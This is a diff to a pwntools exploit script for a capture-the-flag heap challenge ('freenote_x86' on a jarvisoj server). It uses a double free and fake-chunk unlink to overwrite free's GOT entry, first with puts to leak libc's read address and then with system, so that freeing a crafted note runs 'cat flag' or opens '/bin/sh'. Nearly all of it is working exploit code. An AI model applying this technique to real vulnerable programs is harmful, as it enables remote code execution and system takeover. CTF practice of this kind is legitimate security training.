@@ -38,7 +38,7 @@ def main():
     new_note(16, "a"*16)
     new_note(16, "b"*16)
     new_note(16, "c"*16)
-    new_note(16, "d"*16)
+    new_note(25, "cat flag\x00"+"d"*16)
 
     delete_note(0)
     delete_note(2)
@@ -53,8 +53,8 @@ def main():
 
     leak_data = p.recvuntil("cccccccc")
     libc_addr = u32(leak_data[:-8][-4:])
-    system_addr = libc_addr - 1531504
-    log.info("system address is %s", hex(system_addr))
+    # system_addr = libc_addr - 1531504
+    # log.info("system address is %s", hex(system_addr))
 
     delete_note(1)
     payload = p32(0) + p32(0x80)  # fake_chunk1 head
@@ -62,30 +62,43 @@ def main():
     payload += "\x00"*(0x80-0x10) # fake_chunk body
     payload += p32(0x80) + p32(0x88) # fake_chunk2 prev_size and size
     payload += "/bin/sh\x00" + "x00"*(0x20)
-    # gdb.attach(p, "b* 0x080484F5")
+
     edit_note(0, len(payload), payload)
     delete_note(1)  # double free
 
     free_got = 0x0804a29c
+    read_got = 0x0804a294
+    puts_plt = 0x08048480
 
-    payload2 = p32(0x00000002) + p32(0x00000001) + p32(0x4) #
-    payload2 += p32(free_got) + p32(0) + p32(0) + p32(heap_addr-0x80)
+    payload2 = p32(0x00000002) + p32(0x00000001) + p32(0x4) + p32(free_got)  #
+    payload2 += p32(0) + p32(0) + p32(read_got)
+    payload2 += p32(1) + p32(4) + p32(heap_addr-0x88)
+    payload2 += p32(1) + p32(4) + p32(heap_addr+0x80+0x10)
     payload2 += "\x00"*(0xf0-len(payload2))
     edit_note(0, 0xf0, payload2)
-    edit_note(0, 0x4, p32(system_addr))
-
+    edit_note(0, 0x4, p32(puts_plt))
     delete_note(1)
+    #
+    libc = ELF("./libc-2.19.so")
+    read_addr = u32(p.recv(4))
+    log.info("read address is %s ", hex(read_addr))
+    system_addr = read_addr - libc.symbols['read'] + libc.symbols['system']
+    log.info("system address is %s ", hex(system_addr))
+
+    edit_note(0, 4, p32(system_addr))
+    # gdb.attach(p, "b* 0x080484F5")
+    delete_note(3)
+
     p.interactive()
 
 
 if __name__ == '__main__':
-    debug = 1
+    debug = 0
     if debug:
         context(os="linux", arch="i386", log_level="debug")
         context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
         env = {"LD_PRELOAD":"./libc-2.19.so"}
         p = process('./freenote_x86')
-
     else:
         p = remote("pwn2.jarvisoj.com", 9885)
 
